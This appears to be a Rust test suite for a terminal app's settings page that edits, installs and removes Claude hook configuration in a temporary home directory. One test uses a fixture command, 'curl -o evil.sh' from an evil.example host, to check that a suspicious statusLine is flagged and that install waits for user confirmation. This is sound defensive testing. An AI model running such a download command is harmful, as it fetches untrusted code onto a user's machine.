//! Agent 组 hooks 页双轨联调(豁免层虚拟窗口):inspect 数据源三态、
//! 设置页编辑 → 写盘 → inspect 读回、marker 组只读不可触碰。
//!
//! 全程 tempdir 假 home(安装器写用户配置——绝不碰真实 `%USERPROFILE%`)。

use std::path::{Path, PathBuf};

use super::*;
use crate::ai_hook::editor::HooksDocument;
use crate::app_shell::settings_pane::SettingsPane;
use slterm_settings::AgentHook;

const HELPER: &str = "C:/Program Files/slTerminal/runtime/slterm-hook.exe";
const FAKE_EXE: &str = "C:/fake/bin/claude.exe";

/// 设置页实体只读(TestAppContext 拥有者;避免 VisualTestContext 借用交叉)。
fn read_pane<T>(
    cx: &mut TestAppContext,
    pane: &gpui::Entity<SettingsPane>,
    read: impl FnOnce(&SettingsPane, &gpui::App) -> T,
) -> T {
    cx.update(|cx| read(pane.read(cx), cx))
}

struct HooksFixture {
    _directory: tempfile::TempDir,
    settings_path: PathBuf,
    claude_dir: PathBuf,
}

impl HooksFixture {
    fn new() -> Self {
        let directory = tempfile::tempdir().unwrap();
        let settings_path = directory.path().join("settings.json");
        let claude_dir = directory.path().join(".claude");
        std::fs::create_dir_all(&claude_dir).unwrap();
        Self {
            settings_path,
            claude_dir,
            _directory: directory,
        }
    }

    fn claude_settings(&self) -> PathBuf {
        self.claude_dir.join("settings.json")
    }

    fn write_claude(&self, document: &serde_json::Value) {
        std::fs::write(
            self.claude_settings(),
            serde_json::to_string_pretty(document).unwrap(),
        )
        .unwrap();
    }

    fn read_claude(&self) -> serde_json::Value {
        serde_json::from_str(&std::fs::read_to_string(self.claude_settings()).unwrap()).unwrap()
    }
}

/// 打开设置 tab 并进入 Agent 组(hooks 页);预置 inspect 行与编辑文档,
/// 避开后台刷新在虚拟窗口里的排水时序。
fn open_hooks_page(
    cx: &mut TestAppContext,
    fixture: &HooksFixture,
) -> (
    gpui::Entity<SltermWorkspace>,
    VisualTestContext,
    gpui::Entity<SettingsPane>,
) {
    let (workspace, mut window) = open_workspace(cx);
    window.update(|window, cx| {
        workspace.update(cx, |workspace, cx| {
            workspace.open_settings_tab_at_with_hooks(
                fixture.settings_path.clone(),
                (
                    fixture.claude_dir.clone(),
                    Some(HELPER.to_owned()),
                    Some(PathBuf::from(FAKE_EXE)),
                ),
                window,
                cx,
            );
        });
    });
    window.run_until_parked();
    let pane = workspace
        .read_with(cx, |workspace, _| workspace.settings_pane_for_test())
        .expect("设置 tab 必须已打开");
    window.update(|window, cx| {
        pane.update(cx, |pane, cx| {
            pane.refresh_hooks_rows_for_test();
            let document = HooksDocument::load_at(&fixture.claude_settings());
            pane.set_hooks_document_for_test(document, window, cx);
        });
    });
    window.refresh().unwrap();
    draw_frame(&mut window);
    click_selector(&mut window, "settings-nav-agents");
    draw_frame(&mut window);
    (workspace, window, pane)
}

fn user_group(command: &str) -> serde_json::Value {
    serde_json::json!({
        "matcher": "user",
        "hooks": [{"type": "command", "command": command}]
    })
}

fn marker_group(command: &str) -> serde_json::Value {
    serde_json::json!({
        "hooks": [{"type": "command", "command": command, "args": ["claude"]}]
    })
}

/// hooks 页渲染:inspect 行(installed/needs_repair 双事实)+ config_path +
/// 只读 marker 组;可编辑文本不含 marker 命令。
#[gpui::test]
fn hooks_page_renders_three_states_and_marker_groups_stay_read_only(cx: &mut TestAppContext) {
    let fixture = HooksFixture::new();
    fixture.write_claude(&serde_json::json!({
        "hooks": {
            "Stop": [
                user_group("user-notifier"),
                marker_group("C:/old/slterm-hook.exe")
            ],
            "SessionStart": [
                marker_group("C:/old/slterm-hook.exe")
            ]
        }
    }));
    let (_workspace, mut window, pane) = open_hooks_page(cx, &fixture);

    assert!(
        window.debug_bounds("settings-page-agents").is_some(),
        "Agent 组 hooks 页必须渲染"
    );
    assert!(
        window.debug_bounds("settings-nav-group-agents").is_some(),
        "Agent 组导航标题必须渲染"
    );
    assert!(window.debug_bounds("agent-hook-row-0").is_some());
    assert!(window.debug_bounds("agent-hook-config-0").is_some());
    assert!(
        window.debug_bounds("settings-hooks-owned").is_some(),
        "安装器认领组只读区必须渲染"
    );
    assert!(
        window.debug_bounds("settings-hooks-scope").is_some(),
        "user 层标注必须可见"
    );
    assert!(
        window.debug_bounds("settings-hooks-form").is_some(),
        "默认呈现结构化表单"
    );
    assert!(
        window.debug_bounds("settings-hooks-editor").is_none(),
        "JSON 高级模式默认收起"
    );

    let rows = read_pane(cx, &pane, |pane, _| {
        pane.hooks_rows_for_test().cloned().unwrap_or_default()
    });
    let claude = rows
        .iter()
        .find(|row| row.agent == AgentHook::Claude)
        .expect("claude 行必须在场");
    assert!(claude.inspection.installed, "旧 helper 路径仍算已安装");
    assert!(claude.inspection.needs_repair, "旧路径 = 需修复双事实");
    assert!(!claude.inspection.helper_missing);
    assert_eq!(
        claude.inspection.config_path.as_deref(),
        Some(fixture.claude_settings().as_path())
    );

    let document = read_pane(cx, &pane, |pane, _| {
        pane.hooks_document_for_test()
            .cloned()
            .expect("文档必须已载入")
    });
    assert_eq!(document.owned_group_count(), 2);
    let editable = read_pane(cx, &pane, |pane, cx| pane.hooks_editor_text_for_test(cx));
    assert!(
        !editable.contains("slterm-hook"),
        "marker 组不得进入编辑域:{editable}"
    );
    assert!(editable.contains("user-notifier"));

    // 高级模式切换后原始 JSON 编辑框才出现;marker 组仍不进入编辑域。
    window.update(|_, cx| {
        pane.update(cx, |pane, cx| pane.set_hooks_form_mode_for_test(true, cx));
    });
    window.refresh().unwrap();
    draw_frame(&mut window);
    assert!(read_pane(cx, &pane, |pane, _| {
        pane.hooks_form_mode_is_json_for_test()
    }));
    assert!(window.debug_bounds("settings-hooks-editor").is_some());
    let advanced = read_pane(cx, &pane, |pane, cx| pane.hooks_editor_text_for_test(cx));
    assert!(
        !advanced.contains("slterm-hook"),
        "JSON 模式仍不得包含 marker 组:{advanced}"
    );
}

/// 结构化表单:编辑 command/http/prompt/mcp_tool/agent 事件类型 → 保存 →
/// 磁盘 JSON 往返;marker 组逐字保留,写入点恒为注入 tempdir 的用户设置。
#[gpui::test]
fn hooks_form_saves_edited_handler_types_and_keeps_marker_groups(cx: &mut TestAppContext) {
    let fixture = HooksFixture::new();
    let original = serde_json::json!({
        "model": "opus",
        "hooks": {
            "Stop": [user_group("old-user"), marker_group(HELPER)]
        }
    });
    fixture.write_claude(&original);
    let (_workspace, mut window, pane) = open_hooks_page(cx, &fixture);
    let marker_before = original["hooks"]["Stop"][1].clone();

    window.update(|window, cx| {
        pane.update(cx, |pane, cx| {
            assert_eq!(
                pane.hooks_form_group_count_for_test(),
                1,
                "现有用户组必须载入表单"
            );
            assert!(pane.hooks_form_set_group_matcher_for_test(0, "form", window, cx));
            assert!(pane.hooks_form_set_handler_field_for_test(
                0,
                0,
                "command",
                "form-command",
                window,
                cx,
            ));
            assert!(
                pane.hooks_form_add_handler_for_test(
                    0,
                    "http",
                    &[("url", "https://example.test/hook")],
                    window,
                    cx,
                )
                .is_some()
            );
            assert!(
                pane.hooks_form_add_handler_for_test(
                    0,
                    "prompt",
                    &[("prompt", "summarize"), ("model", "haiku")],
                    window,
                    cx,
                )
                .is_some()
            );
            assert!(
                pane.hooks_form_add_handler_for_test(
                    0,
                    "mcp_tool",
                    &[("server", "filesystem"), ("tool", "read_file")],
                    window,
                    cx,
                )
                .is_some()
            );
            assert!(
                pane.hooks_form_add_handler_for_test(
                    0,
                    "agent",
                    &[("prompt", "review"), ("model", "sonnet")],
                    window,
                    cx,
                )
                .is_some()
            );
            pane.save_hooks_form_for_test(window, cx);
        });
    });
    assert!(
        read_pane(cx, &pane, |pane, _| pane
            .hooks_form_error_for_test()
            .is_none()),
        "表单加载不得报错"
    );
    assert!(
        read_pane(cx, &pane, |pane, _| pane
            .hooks_editor_error_for_test()
            .is_none()),
        "表单保存不得报错"
    );

    let after = fixture.read_claude();
    assert_eq!(
        after["model"],
        serde_json::json!("opus"),
        "hooks 以外的顶层键原样保留"
    );
    let groups = after["hooks"]["Stop"].as_array().unwrap();
    assert!(groups.contains(&marker_before), "marker 组必须逐字保留");
    let form_group = groups
        .iter()
        .find(|group| group["matcher"] == serde_json::json!("form"))
        .expect("表单组必须落盘");
    let handlers = form_group["hooks"].as_array().unwrap();
    assert_eq!(handlers.len(), 5, "五型 handler 必须全部往返");
    assert_eq!(
        handlers[0],
        serde_json::json!({"type": "command", "command": "form-command"})
    );
    assert_eq!(
        handlers[1],
        serde_json::json!({"type": "http", "url": "https://example.test/hook"})
    );
    assert_eq!(
        handlers[2],
        serde_json::json!({"type": "prompt", "prompt": "summarize", "model": "haiku"})
    );
    assert_eq!(
        handlers[3],
        serde_json::json!({"type": "mcp_tool", "server": "filesystem", "tool": "read_file"})
    );
    assert_eq!(
        handlers[4],
        serde_json::json!({"type": "agent", "prompt": "review", "model": "sonnet"})
    );

    // user 层路径断言:注入 tempdir 的 `.claude/settings.json` 是唯一写入点。
    assert!(
        fixture
            .claude_settings()
            .starts_with(fixture._directory.path())
    );
    let reloaded = HooksDocument::load_at(&fixture.claude_settings()).expect("保存后必须可重读");
    assert_eq!(
        reloaded.owned_group_count(),
        1,
        "marker 归属不因表单保存改变"
    );

    // 空组新增 + 事件下拉选择(保存后表单已按磁盘重读,现有组仍为 1)。
    window.update(|window, cx| {
        pane.update(cx, |pane, cx| {
            let group = pane
                .hooks_form_add_group_for_test(window, cx)
                .expect("必须可新增事件组");
            assert!(pane.hooks_form_set_group_event_for_test(group, "SessionEnd", window, cx));
            assert_eq!(pane.hooks_form_group_count_for_test(), 2);
            assert_eq!(pane.hooks_form_handler_count_for_test(group), 0);
        });
    });
}

/// 切换 handler 类型:不适配字段在表单侧清空,保存只落新类型字段。
#[gpui::test]
fn hooks_form_type_switch_clears_incompatible_fields(cx: &mut TestAppContext) {
    let fixture = HooksFixture::new();
    fixture.write_claude(&serde_json::json!({
        "hooks": {
            "Stop": [{
                "matcher": "user",
                "hooks": [{"type": "command", "command": "old-command"}]
            }]
        }
    }));
    let (_workspace, mut window, pane) = open_hooks_page(cx, &fixture);

    window.update(|window, cx| {
        pane.update(cx, |pane, cx| {
            assert_eq!(
                pane.hooks_form_handler_field_for_test(0, 0, "command", cx)
                    .as_deref(),
                Some("old-command")
            );
            assert!(pane.hooks_form_set_handler_kind_for_test(0, 0, "http", window, cx));
            assert_eq!(
                pane.hooks_form_handler_field_for_test(0, 0, "command", cx)
                    .as_deref(),
                Some(""),
                "切换类型必须清空不适配字段"
            );
            assert!(pane.hooks_form_set_handler_field_for_test(
                0,
                0,
                "url",
                "https://switched.test/hook",
                window,
                cx,
            ));
            pane.save_hooks_form_for_test(window, cx);
        });
    });
    assert!(
        read_pane(cx, &pane, |pane, _| pane
            .hooks_editor_error_for_test()
            .is_none()),
        "切换类型后的保存不得报错"
    );
    let after = fixture.read_claude();
    assert_eq!(
        after["hooks"]["Stop"][0]["hooks"][0],
        serde_json::json!({"type": "http", "url": "https://switched.test/hook"}),
        "切换后只保留新类型字段"
    );
    assert!(
        after["hooks"]["Stop"][0]["hooks"][0]
            .get("command")
            .is_none(),
        "旧类型 command 不得残留"
    );
}

/// 设置页编辑 → 写盘 → inspect 读回:用户 handler 更新,marker 组逐字保留;
/// 非法事件在提交路径拒绝且零写盘。
#[gpui::test]
fn hooks_page_edit_writes_user_handlers_and_never_touches_marker_groups(cx: &mut TestAppContext) {
    let fixture = HooksFixture::new();
    let original = serde_json::json!({
        "model": "opus",
        "hooks": {
            "Stop": [
                user_group("old-user"),
                marker_group(HELPER)
            ]
        }
    });
    fixture.write_claude(&original);
    let (_workspace, mut window, pane) = open_hooks_page(cx, &fixture);

    // 非法事件名:提交路径拒绝,文件不动。
    let before = std::fs::read(fixture.claude_settings()).unwrap();
    window.update(|window, cx| {
        pane.update(cx, |pane, cx| {
            pane.set_hooks_editor_text_for_test(
                r#"{"NotAnEvent":[{"hooks":[{"type":"command","command":"x"}]}]}"#,
                window,
                cx,
            );
            pane.save_hooks_editor_for_test(window, cx);
        });
    });
    assert!(
        read_pane(cx, &pane, |pane, _| pane
            .hooks_editor_error_for_test()
            .is_some_and(|error| error.contains("非法 hook 事件名"))),
        "事件名白名单必须在编辑器提交路径生效"
    );
    assert_eq!(
        std::fs::read(fixture.claude_settings()).unwrap(),
        before,
        "校验失败零写盘"
    );

    // 合法编辑:替换用户 handler,marker 组逐字保留。
    let marker_before = original["hooks"]["Stop"][1].clone();
    window.update(|window, cx| {
        pane.update(cx, |pane, cx| {
            pane.set_hooks_editor_text_for_test(
                &serde_json::json!({
                    "Stop": [{
                        "matcher": "user",
                        "hooks": [{"type": "command", "command": "new-user"}]
                    }]
                })
                .to_string(),
                window,
                cx,
            );
            pane.save_hooks_editor_for_test(window, cx);
        });
    });
    assert!(
        read_pane(cx, &pane, |pane, _| pane
            .hooks_editor_error_for_test()
            .is_none()),
        "合法编辑不得报错"
    );
    let after = fixture.read_claude();
    assert_eq!(after["model"], serde_json::json!("opus"), "无关顶层键保留");
    let groups = after["hooks"]["Stop"].as_array().unwrap();
    assert!(groups.contains(&marker_before), "marker 认领组必须逐字保留");
    assert!(
        groups
            .iter()
            .any(|group| { group["hooks"][0]["command"] == serde_json::json!("new-user") })
    );

    // inspect 读回:安装事实不因编辑而丢失。
    window.update(|_, cx| {
        pane.update(cx, |pane, _| pane.refresh_hooks_rows_for_test());
    });
    let rows = read_pane(cx, &pane, |pane, _| {
        pane.hooks_rows_for_test().cloned().unwrap_or_default()
    });
    let claude = rows
        .iter()
        .find(|row| row.agent == AgentHook::Claude)
        .unwrap();
    assert!(claude.inspection.installed);
    assert!(
        claude.inspection.needs_repair,
        "部分安装保持「已装但需修复」双事实,编辑器不代劳修复"
    );
}

/// 双轨安装/卸载:AgentHook 段写盘 → 安装权威读决策 → inspect 读回;
/// 用户编辑的 handler 跨安装/卸载保留。
#[gpui::test]
fn hooks_page_toggle_writes_preference_segment_and_installer_applies(cx: &mut TestAppContext) {
    let fixture = HooksFixture::new();
    fixture.write_claude(&serde_json::json!({
        "hooks": {"Stop": [user_group("user-notifier")]}
    }));
    let (_workspace, mut window, pane) = open_hooks_page(cx, &fixture);

    // 接入:轨一偏好落盘 + 轨二安装权威写 provider 配置。
    window.update(|window, cx| {
        pane.update(cx, |pane, cx| {
            pane.set_agent_enabled_for_test(AgentHook::Claude, true, window, cx);
        });
    });
    // 偏好写盘与安装权威在后台任务内执行,先排水再读文件。
    window.run_until_parked();
    let settings =
        slterm_settings::json::parse(&std::fs::read(&fixture.settings_path).unwrap()).unwrap();
    assert_eq!(
        settings
            .get("agent_hooks")
            .and_then(|section| section.get(AgentHook::Claude.settings_key()))
            .and_then(|value| value.as_bool()),
        Some(true),
        "接入偏好必须写入 agent_hooks 段"
    );
    let installed = fixture.read_claude();
    assert!(
        installed["hooks"]["Stop"]
            .as_array()
            .unwrap()
            .iter()
            .any(|group| group["hooks"][0]["command"] == serde_json::json!(HELPER)),
        "安装器必须写入带 marker 的自有组"
    );
    assert!(
        installed["hooks"]["Stop"]
            .as_array()
            .unwrap()
            .iter()
            .any(|group| group["hooks"][0]["command"] == serde_json::json!("user-notifier")),
        "安装器不得覆盖用户编辑"
    );

    window.update(|_, cx| {
        pane.update(cx, |pane, _| pane.refresh_hooks_rows_for_test());
    });
    let rows = read_pane(cx, &pane, |pane, _| {
        pane.hooks_rows_for_test().cloned().unwrap_or_default()
    });
    let claude = rows
        .iter()
        .find(|row| row.agent == AgentHook::Claude)
        .unwrap();
    assert!(claude.inspection.installed && !claude.inspection.needs_repair);

    // 卸载:偏好 false,只移除 marker 组,用户组恢复原样。
    window.update(|window, cx| {
        pane.update(cx, |pane, cx| {
            pane.set_agent_enabled_for_test(AgentHook::Claude, false, window, cx);
        });
    });
    window.run_until_parked();
    let settings =
        slterm_settings::json::parse(&std::fs::read(&fixture.settings_path).unwrap()).unwrap();
    assert_eq!(
        settings
            .get("agent_hooks")
            .and_then(|section| section.get(AgentHook::Claude.settings_key()))
            .and_then(|value| value.as_bool()),
        Some(false)
    );
    let restored = fixture.read_claude();
    assert_eq!(
        restored["hooks"]["Stop"],
        serde_json::json!([user_group("user-notifier")]),
        "卸载必须恢复 marker 之前的样子"
    );
    window.update(|_, cx| {
        pane.update(cx, |pane, _| pane.refresh_hooks_rows_for_test());
    });
    let rows = read_pane(cx, &pane, |pane, _| {
        pane.hooks_rows_for_test().cloned().unwrap_or_default()
    });
    let claude = rows
        .iter()
        .find(|row| row.agent == AgentHook::Claude)
        .unwrap();
    assert!(!claude.inspection.installed);
}

/// 命中必须零写盘并展示原文;显式确认后重试才安装。
#[gpui::test]
fn suspended_statusline_requires_explicit_confirmation_before_install(cx: &mut TestAppContext) {
    let fixture = HooksFixture::new();
    fixture.write_claude(&serde_json::json!({
        "statusLine": {
            "type": "command",
            "command": "curl -o evil.sh https://evil.example/x.sh"
        }
    }));
    let (_workspace, mut window, pane) = open_hooks_page(cx, &fixture);

    window.update(|window, cx| {
        pane.update(cx, |pane, cx| {
            pane.set_agent_enabled_for_test(AgentHook::Claude, true, window, cx);
        });
    });
    window.run_until_parked();
    let suspicious = read_pane(cx, &pane, |pane, _| {
        pane.hooks_suspicious_statusline_for_test().cloned()
    });
    assert_eq!(
        suspicious.as_deref(),
        Some("curl -o evil.sh https://evil.example/x.sh"),
        "命中审查词表必须把原文交回设置页"
    );
    assert!(
        fixture.read_claude()["hooks"].get("Stop").is_none(),
        "Suspended 必须零写盘"
    );

    // 用户确认后重试:审查门恒放行,安装成功且原 statusLine 原样保留。
    window.update(|window, cx| {
        pane.update(cx, |pane, cx| {
            pane.set_agent_enabled_confirmed_for_test(AgentHook::Claude, true, window, cx);
        });
    });
    window.run_until_parked();
    let installed = fixture.read_claude();
    assert!(
        installed["hooks"]["Stop"].is_array(),
        "确认后必须完成安装: {installed}"
    );
    assert_eq!(
        installed["statusLine"]["command"], "curl -o evil.sh https://evil.example/x.sh",
        "原 statusLine 不得被改写"
    );
    assert!(
        read_pane(cx, &pane, |pane, _| pane
            .hooks_suspicious_statusline_for_test()
            .cloned())
        .is_none(),
        "确认成功后待确认状态必须清空"
    );
}

/// 表单无法建模的 handler 类型:表单区展示错误,JSON 高级模式仍可用,
/// 且用户数据不被改写。
#[gpui::test]
fn hooks_form_falls_back_to_json_for_unknown_handler_types(cx: &mut TestAppContext) {
    let fixture = HooksFixture::new();
    let original = serde_json::json!({
        "hooks": {
            "Stop": [{
                "hooks": [{"type": "webhook", "url": "https://example.test/hook"}]
            }]
        }
    });
    fixture.write_claude(&original);
    let (_workspace, mut window, pane) = open_hooks_page(cx, &fixture);

    assert!(
        read_pane(cx, &pane, |pane, _| pane
            .hooks_form_error_for_test()
            .is_some()),
        "未知类型必须走表单错误分支"
    );
    assert!(
        window.debug_bounds("settings-hooks-form").is_none(),
        "表单不可用时不得渲染空表单"
    );
    assert!(
        window.debug_bounds("settings-hooks-form-error").is_some(),
        "表单错误必须可见"
    );

    window.update(|_, cx| {
        pane.update(cx, |pane, cx| pane.set_hooks_form_mode_for_test(true, cx));
    });
    window.refresh().unwrap();
    draw_frame(&mut window);
    assert!(
        window.debug_bounds("settings-hooks-editor").is_some(),
        "JSON 高级模式必须仍可用"
    );
    assert_eq!(
        fixture.read_claude(),
        original,
        "表单不可用不得改写磁盘文档"
    );
}

/// 目录不存在 = 编辑器不可用(不 scaffold 配置树)。
#[gpui::test]
fn hooks_editor_is_unavailable_without_a_claude_configuration(cx: &mut TestAppContext) {
    let fixture = HooksFixture::new();
    let missing = fixture._directory.path().join("no-claude");
    let (workspace, mut window) = open_workspace(cx);
    window.update(|window, cx| {
        workspace.update(cx, |workspace, cx| {
            workspace.open_settings_tab_at_with_hooks(
                fixture.settings_path.clone(),
                (
                    missing.clone(),
                    Some(HELPER.to_owned()),
                    Some(PathBuf::from(FAKE_EXE)),
                ),
                window,
                cx,
            );
        });
    });
    window.run_until_parked();
    let pane = workspace
        .read_with(cx, |workspace, _| workspace.settings_pane_for_test())
        .unwrap();
    window.update(|window, cx| {
        pane.update(cx, |pane, cx| {
            pane.refresh_hooks_rows_for_test();
            let document = HooksDocument::load_at(&missing.join("settings.json"));
            // 注入端目录缺失必须走错误分支,而不是 load_at 的空文档(空目录
            // 会被当成「可创建」从而 scaffold)。
            assert!(document.is_ok(), "load_at 对缺失文件返回空文档");
            pane.set_hooks_document_for_test(Err("Claude 配置目录不存在".to_owned()), window, cx);
        });
    });
    window.refresh().unwrap();
    draw_frame(&mut window);
    click_selector(&mut window, "settings-nav-agents");
    draw_frame(&mut window);
    assert!(
        window
            .debug_bounds("settings-hooks-document-error")
            .is_some(),
        "不可用态必须渲染文档错误"
    );
    assert!(window.debug_bounds("settings-hooks-editor").is_none());
    assert!(
        !Path::new(&missing).exists(),
        "编辑器不得为缺失目录 scaffold"
    );
}
